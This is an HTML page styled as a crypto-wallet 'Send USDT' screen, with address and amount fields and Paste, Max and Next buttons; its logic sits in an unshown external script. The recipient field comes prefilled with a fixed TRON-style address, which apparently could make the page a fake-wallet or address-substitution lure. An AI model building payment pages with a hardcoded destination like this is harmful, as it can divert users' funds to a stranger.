<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Send USDT</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #0d0d0d;
      color: white;
      font-family: Arial, sans-serif;
    }

    .container {
      max-width: 400px;
      margin: 0 auto;
      padding: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: bold;
      color: #ccc;
    }

    .input-group {
      display: flex;
      align-items: center;
      background-color: #1a1a1a;
      border: 1px solid #333;
      border-radius: 8px;
      padding: 10px;
      margin-bottom: 20px;
    }

    input[type="text"],
    input[type="number"] {
      flex: 1;
      background-color: transparent;
      border: none;
      color: white;
      outline: none;
      font-size: 16px;
    }

    .input-group button {
      margin-left: 10px;
      background-color: transparent;
      color: #00ff99;
      border: none;
      cursor: pointer;
      font-size: 14px;
    }

    .usd-value {
      margin-top: -10px;
      margin-bottom: 20px;
      color: #999;
    }

    .next-button {
      width: 100%;
      background-color: #00cc66;
      color: white;
      padding: 15px;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 50px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <label for="address">Address or Domain Name</label>
    <div class="input-group">
      <input type="text" id="address" value="TQP59pp5o9x6ohP8A6NWqUu9iJ3LfTNEKQ" />
      <button onclick="pasteAddress()">Paste</button>
    </div>

    <label for="amount">Amount</label>
    <div class="input-group">
      <input type="number" id="amount" placeholder="USDT Amount" oninput="updateUSD()" />
      <span style="margin-left: 10px;">USDT</span>
      <button onclick="setMax()">Max</button>
    </div>

    <div class="usd-value" id="usdValue">â‰ˆ $0.00</div>

    <button id="Next" class="next-button" onclick="Next()">Next</button>
  </div>

  <script src="script.js"></script>
</body>
</html>
